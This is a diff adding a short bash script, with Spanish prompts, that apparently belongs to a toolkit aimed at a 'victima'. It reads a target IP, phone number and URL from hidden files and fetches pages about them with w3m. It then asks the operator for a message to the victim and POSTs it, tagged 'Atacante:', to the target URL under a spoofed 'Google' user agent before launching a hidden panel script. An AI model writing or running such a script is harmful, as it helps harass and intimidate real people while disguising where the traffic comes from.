@@ -1,0 +1,21 @@
+bash .banner
+
+# Read
+
+a=$(cat .ip)
+b=$(cat .cel)
+c=$(cat .list)
+
+# Read End
+
+echo "Datos:"
+w3m -dump $a
+w3m -dump $b
+echo ""
+echo "Introduce un mensaje para la victima:"
+read msg
+
+ATC=Atacante:/
+USER_AGENT=Google
+curl -X POST "$c" --verbose --user-agent $USER_AGENT --data-urlencode "nombre=$ATC$msg"
+bash .panel
